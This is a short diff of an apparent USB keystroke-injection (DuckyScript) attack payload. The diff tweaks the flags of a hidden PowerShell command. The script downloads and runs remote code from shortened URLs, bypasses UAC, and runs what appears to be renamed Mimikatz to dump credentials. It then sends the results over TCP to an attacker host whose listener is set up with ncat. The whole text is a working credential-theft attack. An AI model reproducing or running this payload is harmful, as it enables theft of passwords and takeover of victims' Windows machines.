@@ -2,7 +2,7 @@ REM ####Attacker's side####
 REM ### Run this on Attacker's VPS: ncat -k -l -p 80 | tee mimikatz.log
 GUI r
 DELAY 500
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadString('https://goo.gl/KSZT1U');Bypass-UAC -Method ucmDismMethod;"
+STRING powershell -nop -noni -w 1 -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadString('https://goo.gl/KSZT1U');Bypass-UAC -Method ucmDismMethod;"
 ENTER
 DELAY 5000
 STRING IEX (New-Object Net.WebClient).DownloadString('https://goo.gl/TzQm4N'); $port=80; $remoteHost='###ATTACKER IP###'; $Message = Invoke-vladimir -blet; $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port); $data = [System.Text.Encoding]::ASCII.GetBytes($Message); $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;
